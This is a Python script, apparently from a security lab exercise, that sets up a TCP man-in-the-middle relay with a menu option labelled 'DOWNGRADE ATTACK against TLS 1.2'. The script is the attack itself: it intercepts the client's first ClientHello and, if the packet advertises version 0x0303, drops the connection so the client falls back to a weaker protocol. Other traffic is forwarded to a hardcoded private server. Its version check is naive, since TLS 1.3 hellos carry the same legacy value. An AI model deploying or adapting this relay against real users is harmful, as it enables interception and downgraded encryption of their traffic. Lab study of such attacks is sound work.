import socket
import struct
import threading

def parse_clienthello_tls_version(data):
    if len(data) < 11:
        return False
    
    # --- TLS record header ---
    # Header TLS
    # TLS record: ContentType(1) + Version(2) + Length(2)
    content_type, version, length = struct.unpack(">BHH", data[:5])
    if content_type != 0x16:  # not Handshake
        return False

    # --- Handshake header ---
    handshake_type = data[5]
    if handshake_type != 0x01:  # not ClientHello
        return False

    # Offset after handshake header (4 byte: type+length)
    offset = 9  # legacy_version starts here (after 5+4 bytes)
    legacy_version = struct.unpack(">H", data[offset:offset+2])[0] #(first two bytes of ClientHello)

    # No extension, use only legacy_version
    if legacy_version == 0x0303: # TLS 1.2
        return True  
    return False



def forward(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except:
        pass
    finally:
        src.close()
        dst.close()


def relay_server(choice, listen_port, server_ip, server_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", listen_port))
    sock.listen(1)
    print(f"Listening {listen_port}...")

    while True:
        client, addr = sock.accept()
        print(f"Connection from {addr}")

        first_data = client.recv(4096)
        if not first_data:
            client.close()
            continue
        
        detected = parse_clienthello_tls_version(first_data)

        if choice == '2' and detected:
            print("TLS 1.2 ClientHello detected: sending error")
            client.send(b"Hello, TLS 1.2 is not supported here!\n")
            client.close()
            continue

        print("Sending packets towards the server...")
        server = socket.create_connection((server_ip, server_port))
        server.sendall(first_data)
        print("Packets sent!")

        threading.Thread(target=forward, args=(client, server), daemon=True).start()
        threading.Thread(target=forward, args=(server, client), daemon=True).start()


if __name__ == "__main__":
    print("Menu:")
    print("1) NO DOWNGRADE")
    print("2) DOWNGRADE ATTACK against TLS 1.2")

    choice = input("\nChoose the mode: ")
    if choice not in ['1','2']:
        print("Invalid choice, using mode 1 by default.")
        choice = '1'

    relay_server(choice, listen_port=8080, server_ip="192.168.91.139", server_port=4433) # set the server IP address and the port
    
